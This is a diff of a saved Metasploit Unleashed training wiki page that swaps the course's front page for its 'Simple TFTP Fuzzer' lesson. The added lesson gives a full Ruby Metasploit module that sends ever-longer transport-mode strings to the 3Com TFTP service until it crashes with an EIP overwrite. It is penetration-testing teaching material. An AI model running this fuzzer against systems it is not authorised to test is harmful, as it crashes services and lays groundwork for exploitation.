@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Simple TFTP Fuzzer - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Simple_TFTP_Fuzzer" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Simple_TFTP_Fuzzer&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Simple_TFTP_Fuzzer&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Simple_TFTP_Fuzzer&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,213 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Simple TFTP Fuzzer</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Simple_TFTP_Fuzzer#column-one">navigation</a>, <a href="Simple_TFTP_Fuzzer#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>One of the most powerful aspects of Metasploit is how easy it is to make changes and create new functionality by reusing existing code. For instance, as this very simple fuzzer code demonstrates, you can make a few minor modifications to an existing Metasploit module to create a fuzzer module. The changes will pass ever-increasing lengths to the transport mode value to the 3Com TFTP Service for Windows, resulting in an overwrite of EIP.
+<br />
+<br />
+<pre>#Metasploit
+
+require 'msf/core'
+class Metasploit3 < Msf::Auxiliary
+        include Msf::Auxiliary::Scanner
+        def initialize
+                super(
+                        'Name'           => '3Com TFTP Fuzzer',
+                        'Version'        => '$Revision: 1 $',
+                        'Description'    => '3Com TFTP Fuzzer Passes Overly Long Transport Mode String',
+                        'Author'         => 'Your name here',
+                        'License'        => MSF_LICENSE
+                )
+                register_options( [
+                Opt::RPORT(69)
+                ], self.class)
+        end
+        def run_host(ip)
+                # Create an unbound UDP socket
+                udp_sock = Rex::Socket::Udp.create(
+                        'Context'   =>
+                                {
+                                        'Msf'        => framework,
+                                        'MsfExploit' => self,
+                                }
+                )
+                count = 10  # Set an initial count
+                while count < 2000  # While the count is under 2000 run
+                        evil = "A" * count  # Set a number of "A"s equal to count
+                        pkt = "\x00\x02" + "\x41" + "\x00" + evil + "\x00"  # Define the payload
+                        udp_sock.sendto(pkt, ip, datastore['RPORT'])  # Send the packet
+                        print_status("Sending: #{evil}")  # Status update
+                        resp = udp_sock.get(1)  # Capture the response
+                        count += 10  # Increase count by 10, and loop
+                end
+        end
+end</pre>
+<br />
+Pretty straight forward. Lets run it and see what happens.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<div class="center"><div class="floatnone"><a href="File:EIP_Overwrite.jpg" class="image"><img alt="EIP Overwrite.jpg" src="http://www.offensive-security.com/w/images/1/12/EIP_Overwrite.jpg" width="643" height="480" /></a></div></div>
 <p><br />
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
+And we have a crash! The fuzzer is working as expected. While this may seem simple on the surface, one thing to consider is the reusable code that this provides us. In our example, the payload structure was defined for us, saving us time, and allowing us to get directly to the fuzzing rather than researching the protocol. This is extremely powerful, and is a hidden benefit of the framework.
 <br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Writing_A_Simple_Fuzzer" title="Writing A Simple Fuzzer">Writing A Simple Fuzzer</a> &gt; Simple TFTP Fuzzer</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><strong class="selflink">Simple TFTP Fuzzer</strong> &#124; <a href="Simple_IMAP_Fuzzer" title="Simple IMAP Fuzzer">Simple IMAP Fuzzer</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 496/1000000
+Preprocessor generated node count: 2601/1000000
+Post‐expand include size: 3840/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:39-0!*!0!*!*!2!* and timestamp 20131123155242 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Simple_TFTP_Fuzzer&amp;oldid=47">http://www.offensive-security.com/w/index.php?title=Simple_TFTP_Fuzzer&amp;oldid=47</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Writing_A_Simple_Fuzzer&amp;action=edit&amp;redlink=1" class="new" title="Category:Writing A Simple Fuzzer (page does not exist)">Writing A Simple Fuzzer</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +698,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.186 secs. --></body></html>
